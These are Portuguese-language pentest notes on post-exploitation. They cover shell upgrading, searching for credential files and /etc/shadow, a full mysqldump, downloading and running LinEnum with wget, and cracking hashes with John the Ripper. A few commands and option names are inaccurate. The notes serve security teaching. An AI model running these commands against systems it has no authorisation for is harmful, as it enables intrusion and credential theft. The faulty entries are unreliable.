
# Post exploitation

A fase de Post Exploitation em um Pentest envolve a exploração e uso do acesso obtido para obter mais informações, manter persistência e escalar privilégios dentro do sistema comprometido. O objetivo principal é coletar dados valiosos, identificar outras vulnerabilidades e preparar a fase de exfiltração de informações.

---

### Upgrade de Shell

Após obter uma shell básica, pode ser necessário convertê-la em uma shell interativa com mais funcionalidades, como suporte a comandos interativos e atalhos. Isso pode ser feito com:

- Python: `python -c 'import pty; pty.spawn("/bin/bash")'`

- Bash: `echo os.system('/bin/bash')`

- Socat: Para abrir uma shell reversa interativa.

---

### Spawnar uma Shell

Quando o atacante obtém acesso a um sistema, pode ser necessário spawnar uma shell para ganhar um ambiente mais funcional. Métodos comuns incluem:

- Usar `python -c 'import pty; pty.spawn("/bin/bash")'`

- Criar um processo em background (`CTRL+Z`) e reativá-lo com `stty raw -echo; fg`

- Usar Metasploit para estabilizar a shell (`shell -upgrade`)

---

### Buscar por Arquivos

Uma das primeiras ações é procurar por arquivos sensíveis que possam conter informações importantes, como credenciais, chaves SSH, ou configurações críticas.

- Comandos úteis:
  - `find / -type f -name "*.conf" 2>/dev/null`
  
  - `find / -type f -iname "*password*" 2>/dev/null`
  
  - `grep -r "password" /home/ 2>/dev/null`

---

### Buscar Credenciais

Senhas podem estar armazenadas em arquivos de configuração, logs, histórico de comandos ou mesmo na memória do sistema.

- Locais comuns para encontrar credenciais:
  - `/etc/shadow` (senhas de usuários do Linux)
  
  - `~/.bash_history`
  
  - Arquivos de configuração de banco de dados (`wp-config.php`, `my.cnf`)
  
  - Ferramentas como `strings` e `grep` para extrair credenciais de arquivos

---

### mysqldump

Se houver acesso ao banco de dados MySQL, é possível extrair informações sensíveis, incluindo senhas e dados de clientes.

- Comando para dump completo do banco:
    ~~~bash
    mysqldump -u root -p --all-databases > backup.sql
    ~~~

- Para dump de uma tabela específica:
    ~~~bash
    mysqldump -u usuario -p database tabela > tabela.sql
    ~~~

---

### Informações dos Usuários

A obtenção de informações dos usuários permite identificar potenciais alvos para escalonamento de privilégios.

- Comandos úteis para listar usuários e grupos:
  - `cat /etc/passwd`
  
  - `cat /etc/group`
  
  - `whoami && id`
  
  - `last` (ver histórico de logins)
  
  - `w` ou `who` (ver usuários logados)

---

### LinEnum Script

O LinEnum é um script usado para enumeração de informações do sistema e descoberta de possíveis vetores de escalonamento de privilégios.

- Baixar e executar o LinEnum:
    ~~~bash
    wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
    chmod +x LinEnum.sh
    ./LinEnum.sh
    ~~~

- Ele verifica permissões erradas, arquivos com SUID, configurações de sudoers, versões vulneráveis do kernel, entre outros.

---

### Pasta `/var`

O diretório /var pode conter informações valiosas para pós-exploração.

- Locais de interesse:
  - `/var/log/`: Logs do sistema e de aplicativos
  
  - `/var/backups/`: Possíveis backups antigos contendo credenciais
  
  - `/var/www/`: Arquivos de aplicações web, incluindo bancos de dados e configurações

---

### Arquivos de Backups

Backups podem conter versões antigas de arquivos críticos, como credenciais ou configurações expostas.

- Procurar arquivos de backup:
    ~~~bash
    find / -type f \( -iname "*.bak" -o -iname "*.backup" -o -iname "*.old" \) 2>/dev/null
    ~~~

---

### Tipos de Criptografia Hash

Hashing é um método de proteção de senhas e outros dados sensíveis. Alguns algoritmos comuns incluem:

- MD5 (obsoleto e facilmente quebrável)

- SHA-1 (considerado fraco)

- HA-256/SHA-512 (mais seguros)

- bcrypt e PBKDF2 (melhores para senhas devido ao fator de custo)

- NTLM (usado em sistemas Windows)

- LM Hash (antigo e vulnerável em Windows)

---

### John (Script para Quebrar Hashes)

O John the Ripper é uma ferramenta para quebrar senhas por meio de ataques de força bruta e dicionário.

- Crackear um hash MD5 armazenado em um arquivo:
    ~~~bash
    john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
    ~~~

- Ver senhas encontradas:
    ~~~bash
    john --show hash.txt
    ~~~

- Usar um modo automático para diferentes formatos:
    ~~~bash
    john hash.txt --format=auto
    ~~~

---